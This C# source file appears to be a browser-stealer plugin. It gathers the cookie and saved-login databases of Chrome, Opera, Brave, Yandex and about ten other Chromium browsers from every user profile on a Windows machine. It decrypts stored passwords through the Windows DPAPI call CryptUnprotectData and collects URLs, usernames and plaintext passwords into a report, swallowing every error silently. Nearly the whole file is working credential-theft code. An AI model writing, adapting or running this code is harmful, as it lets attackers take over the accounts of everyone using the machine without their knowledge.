using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Plugin.Browsers.Chromium;

namespace Plugin.Browsers.Chromium
{
    public class Chromium
    {

        public void CookiesRecovery(StringBuilder Coocks)
        {
            try
            {
                foreach (string str in this.GetAppDataFolders())
                {
                    try
                    {
                        string[] browser = {
                            str + "\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
                            str + "\\Roaming\\Opera Software\\Opera Stable\\Cookies",
                            str + "\\Local\\Vivaldi\\User Data\\Default\\Cookies",
                            str + "\\Local\\Chromium\\User Data\\Default\\Cookies",
                            str + "\\Local\\Torch\\User Data\\Default\\Cookies",
                            str + "\\Local\\Comodo\\Dragon\\User Data\\Default\\Cookies",
                            str + "\\Local\\Xpom\\User Data\\Default\\Cookies",
                            str + "\\Local\\Orbitum\\User Data\\Default\\Cookies",
                            str + "\\Local\\Kometa\\User Data\\Default\\Cookies",
                            str + "\\Local\\Amigo\\User Data\\Default\\Cookies",
                            str + "\\Local\\Nichrome\\User Data\\Default\\Cookies",
                            str + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
                            str + "\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
                            str + "\\Local\\Blisk\\User Data\\Default\\Cookies"
                        };

                        int selected = 0;
                        foreach (string b in browser)
                        {
                            if (File.Exists(b))
                            {
                                SQLiteHandler sqliteHandler = new SQLiteHandler(b);
                                try
                                {
                                    sqliteHandler.ReadTable("cookies");
                                }
                                catch
                                {
                                }

                                switch (selected)
                                {
                                    case 0:
                                        Coocks.Append("\rtf1\ansi\n\n== Chrome ==========\b0\n");
                                        break;
                                    case 1:
                                        Coocks.Append("\n== Opera ===========\n");
                                        break;
                                    case 2:
                                        Coocks.Append("\n== Vivaldi ===========\n");
                                        break;
                                    case 3:
                                        Coocks.Append("\n== Chromium ===========\n");
                                        break;
                                    case 4:
                                        Coocks.Append("\n== Torch ===========\n");
                                        break;
                                    case 5:
                                        Coocks.Append("\n== Comodo ===========\n");
                                        break;
                                    case 6:
                                        Coocks.Append("\n== Xpom ===========\n");
                                        break;
                                    case 7:
                                        Coocks.Append("\n== Orbitum ===========\n");
                                        break;
                                    case 8:
                                        Coocks.Append("\n== Kometa ===========\n");
                                        break;
                                    case 9:
                                        Coocks.Append("\n== Amigo ===========\n");
                                        break;
                                    case 10:
                                        Coocks.Append("\n== Nichrome ===========\n");
                                        break;
                                    case 11:
                                        Coocks.Append("\n== Brave ===========\n");
                                        break;
                                    case 12:
                                        Coocks.Append("\n== Yandex ===========\n");
                                        break;
                                }

                                //List<ChromiumCookies.ChromiumCookie> ffcs = ChromiumCookies.Cookies(b);
                                //foreach (ChromiumCookies.ChromiumCookie fcc in ffcs)
                                //{
                                //    Coocks.Append(string.Concat(new string[]
                                //       {
                                //        fcc.ToString(),
                                //        "\n\n",
                                //       }));
                                //}
                                //Coocks.Append("\n");

                            }

                            selected++;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch
            {
            }
        }


        public void Recovery(StringBuilder Pass)
        {
            try
            {
                foreach (string str in this.GetAppDataFolders())
                {
                    try
                    {
                        string[] browser = {
                            str + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                            str + "\\Roaming\\Opera Software\\Opera Stable\\Login Data",
                            str + "\\Local\\Vivaldi\\User Data\\Default\\Login Data",
                            str + "\\Local\\Chromium\\User Data\\Default\\Login Data",
                            str + "\\Local\\Torch\\User Data\\Default\\Login Data",
                            str + "\\Local\\Comodo\\Dragon\\User Data\\Default\\Login Data",
                            str + "\\Local\\Xpom\\User Data\\Default\\Login Data",
                            str + "\\Local\\Orbitum\\User Data\\Default\\Login Data",
                            str + "\\Local\\Kometa\\User Data\\Default\\Login Data",
                            str + "\\Local\\Amigo\\User Data\\Default\\Login Data",
                            str + "\\Local\\Nichrome\\User Data\\Default\\Login Data",
                            str + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                            str + "\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data",
                        };

                        int selected = 0;
                        foreach (string b in browser)
                        {
                            if (File.Exists(b))
                            {
                                SQLiteHandler sqliteHandler = new SQLiteHandler(b);
                                try
                                {
                                    sqliteHandler.ReadTable("logins");
                                }
                                catch
                                {
                                }

                                switch (selected)
                                {
                                    case 0:
                                        Pass.Append("\n== Chrome ==========\n");
                                        break;
                                    case 1:
                                        Pass.Append("\n== Opera ===========\n");
                                        break;
                                    case 2:
                                        Pass.Append("\n== Vivaldi ===========\n");
                                        break;
                                    case 3:
                                        Pass.Append("\n== Chromium ===========\n");
                                        break;
                                    case 4:
                                        Pass.Append("\n== Torch ===========\n");
                                        break;
                                    case 5:
                                        Pass.Append("\n== Comodo ===========\n");
                                        break;
                                    case 6:
                                        Pass.Append("\n== Xpom ===========\n");
                                        break;
                                    case 7:
                                        Pass.Append("\n== Orbitum ===========\n");
                                        break;
                                    case 8:
                                        Pass.Append("\n== Kometa ===========\n");
                                        break;
                                    case 9:
                                        Pass.Append("\n== Amigo ===========\n");
                                        break;
                                    case 10:
                                        Pass.Append("\n== Nichrome ===========\n");
                                        break;
                                    case 11:
                                        Pass.Append("\n== Brave ===========\n");
                                        break;
                                    case 12:
                                        Pass.Append("\n== Yandex ===========\n");
                                        Pass.Append("Not Work for now!\n");
                                        break;
                                }
                            
                                for (int j = 0; j <= sqliteHandler.GetRowCount() - 1; j++)
                                {
                                    string value = sqliteHandler.GetValue(j, "origin_url");
                                    string value2 = sqliteHandler.GetValue(j, "username_value");
                                    string value3 = sqliteHandler.GetValue(j, "password_value");
                                    string text = string.Empty;
                                    if (!string.IsNullOrEmpty(value3))
                                    {
                                        text = this.Decrypt(Encoding.Default.GetBytes(value3));
                                    }
                                    else
                                    {
                                        text = "";
                                    }
                                    Pass.Append(string.Concat(new string[]
                                    {
                                        value,
                                        "\nU: ",
                                        value2,
                                        "\nP: ",
                                        text,
                                        "\n\n"
                                    }));
                                }

                            }

                            selected++;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch
            {
            }
        }

        private string Decrypt(byte[] Datas)
        {
            string result;
            try
            {
                Chromium.DATA_BLOB data_BLOB = default(Chromium.DATA_BLOB);
                Chromium.DATA_BLOB data_BLOB2 = default(Chromium.DATA_BLOB);
                GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
                Chromium.DATA_BLOB data_BLOB3;
                data_BLOB3.pbData = gchandle.AddrOfPinnedObject();
                data_BLOB3.cbData = Datas.Length;
                gchandle.Free();
                Chromium.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = default(Chromium.CRYPTPROTECT_PROMPTSTRUCT);
                string empty = string.Empty;
                Chromium.CryptUnprotectData(ref data_BLOB3, null, ref data_BLOB2, (IntPtr)0, ref cryptprotect_PROMPTSTRUCT, (Chromium.CryptProtectFlags)0, ref data_BLOB);
                byte[] array = new byte[data_BLOB.cbData + 1];
                Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData);
                string @string = Encoding.UTF8.GetString(array);
                result = @string.Substring(0, @string.Length - 1);
            }
            catch
            {
                result = "";
            }
            return result;
        }

        private string[] GetAppDataFolders()
        {
            List<string> list = new List<string>();
            string[] directories = Directory.GetDirectories(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\", "*", SearchOption.TopDirectoryOnly);
            for (int i = 0; i < directories.Length; i++)
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(directories[i]);
                list.Add(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\" + directoryInfo.Name + "\\AppData");
            }
            return list.ToArray();
        }

        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptProtectData(ref Chromium.DATA_BLOB pDataIn, string szDataDescr, ref Chromium.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref Chromium.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, Chromium.CryptProtectFlags dwFlags, ref Chromium.DATA_BLOB pDataOut);

        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(ref Chromium.DATA_BLOB pDataIn, StringBuilder szDataDescr, ref Chromium.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref Chromium.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, Chromium.CryptProtectFlags dwFlags, ref Chromium.DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;

            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;

            public Chromium.CryptProtectPromptFlags dwPromptFlags;

            public IntPtr hwndApp;

            public string szPrompt;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
            CRYPTPROTECT_PROMPT_ON_PROTECT = 2
        }

        [Flags]
        private enum CryptProtectFlags
        {
            CRYPTPROTECT_UI_FORBIDDEN = 1,
            CRYPTPROTECT_LOCAL_MACHINE = 4,
            CRYPTPROTECT_CRED_SYNC = 8,
            CRYPTPROTECT_AUDIT = 16,
            CRYPTPROTECT_NO_RECOVERY = 32,
            CRYPTPROTECT_VERIFY_PROTECTION = 64
        }

    }
}
